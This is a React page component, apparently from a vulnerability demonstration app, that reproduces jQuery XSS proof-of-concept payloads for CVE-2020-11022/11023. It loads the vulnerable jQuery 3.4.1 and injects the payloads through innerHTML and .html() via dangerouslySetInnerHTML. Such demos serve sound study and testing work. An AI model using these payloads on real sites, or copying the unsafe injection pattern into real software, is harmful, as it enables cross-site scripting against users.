import React, { useState, useEffect } from "react";
import { PageLayout } from "../PageLayout";
import { DisplaySmall } from "baseui/typography";
import { Button } from "baseui/button";
import { Input } from "baseui/input";
import exploitCVE202011023 from '../../actions/exploitCVE202011023'
import jquery from 'jquery';

const rawHTML = `
<h2>PoC 1</h2>
<button onclick="test(1)">Assign to innerHTML</button> <button onclick="test(1,true)">Append via .html()</button>
<xmp id="poc1">
<style><style /><img src=x onerror=alert(1)> 
</xmp>

<h2>PoC 2 (Only jQuery 3.x affected)</h2>
<button onclick="test(2)">Assign to innerHTML</button> <button onclick="test(2,true)">Append via .html()</button>
<xmp id="poc2">
<img alt="<x" title="/><img src=x onerror=alert(1)>">
</xmp>

<h2>PoC 3</h2>
<button onclick="test(3)">Assign to innerHTML</button> <button onclick="test(3,true)">Append via .html()</button>
<xmp id="poc3">
<option><style></option></select><img src=x onerror=alert(1)></style>
</xmp>

<div id="div"></div>
`;

const CVE202011023Page = () => {
  const [query, setQuery] = useState<string>('');

  useEffect(() => {
    const jqueryScript = document.createElement('script');
    const script = document.createElement('script');

    jqueryScript.src = "//cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.js";
    jqueryScript.async = true;

    document.body.appendChild(jqueryScript);

    script.text = `
    function test(n,jq){
      sanitizedHTML = document.getElementById('poc'+n).innerHTML;
      if(jq){
          $('#div').html(sanitizedHTML);
      }else{
          div.innerHTML=sanitizedHTML;
      }
    }
    `;

    document.body.appendChild(script);

    return () => {
      document.body.removeChild(jqueryScript);
      document.body.removeChild(script);
    }
  }, []);

  return (
    <PageLayout>
      <DisplaySmall>jQuery XSS Examples (CVE-2020-11022/CVE-2020-11023)</DisplaySmall>
      <p>CVE-2020-11023</p>
      <a href="https://mksben.l0.cm/2020/05/jquery3.5.0-xss.html">POC</a>
      <div dangerouslySetInnerHTML={{ __html: rawHTML }} />
    </PageLayout>
  );
};
export default CVE202011023Page;
